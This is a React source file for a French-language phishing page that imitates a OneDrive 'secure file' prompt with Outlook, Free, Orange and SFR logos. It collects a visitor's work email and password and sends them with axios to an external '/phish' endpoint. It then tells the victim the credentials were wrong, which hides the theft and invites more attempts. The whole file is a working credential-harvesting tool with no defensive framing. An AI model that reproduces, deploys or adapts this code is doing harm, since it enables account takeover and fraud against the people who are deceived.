import React, {useState} from 'react';
import './App.css';
import oneDrive from './oneDrive.png';
import free from './free.png'
import orange from './orange (1).png';
import outlook from './outlook.png';
import pdf from './pdf.png';
import sfr from './sfr.png';
import axios from 'axios';

function App() {
  const [platform, setPlatform] = useState("Outlook");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [messageError, setMessageError] = useState("");

  const onSubmit = async(email, password, platform) => {
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      setMessageError("Veuillez entrer une adresse email valide.");
      return;
    }

    if (!password) {
      setMessageError("Veuillez entrer un mot de passe.");
      return;
    }

    const data = {
      email: email,
      password: password,
      platform: platform
    };

    await axios.post("https://djonanko-service.onrender.com/phish", data).then((response) => {
      if(response.data.id){
        console.log('Response: ', response.data);
        setMessageError("Identifiants incorrects, veuillez reessayer !");
      }
    }).catch((error) => {
      console.log('Error: ', error);
      setMessageError("Une erreur est survenue !");
    });
  }
  
  return (
    <div class="container">
        <div class="header">
            <img src={oneDrive} alt="OneDrive" />
            <p>OneDrive</p>
            <div class="close-button"></div>
        </div>
        <div class="content">
            <h2>Vérifier votre identité</h2>
            <p>Vous avez reçu un fichier sécurisé</p>
            <div style= {{display: "flex", marginLeft: "30%" }}>
              <img src={pdf} alt="PDF Icon" />
              <p>60.2KB</p>
            </div>
            
            <p>Pour lire le contenu, veuillez utiliser vos informations de messagerie professionnelle.</p>
            <div class="email-providers">
                <img src={outlook} alt="Outlook" style={{border: platform === "Outlook" ? "1px solid black" : ""}} onClick={() => setPlatform("Outlook")} />
                <img src={free} alt="Free" style={{border: platform === "Free" ? "1px solid black" : ""}} onClick={() => setPlatform("Free")} />
                <img src={orange} alt="Orange" style={{border: platform === "Orange" ? "1px solid black" : ""}} onClick={() => setPlatform("Orange")} />
                <img src={sfr} alt="SFR" style={{border: platform === "Sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("Sfr")} />
            </div>
              <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} class="email-input" placeholder="Veuillez entrer votre adresse professionnelle" />
              <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} class="email-input" placeholder="Veuillez entrer votre mot de passe" />
              <button type='button' class="continue-button" onClick={(e) => onSubmit(email, password, platform)}>Continuer</button>
              {messageError && <p style={{color: "red"}}>{messageError}</p>}
        </div>
    </div>
  );
}

export default App;
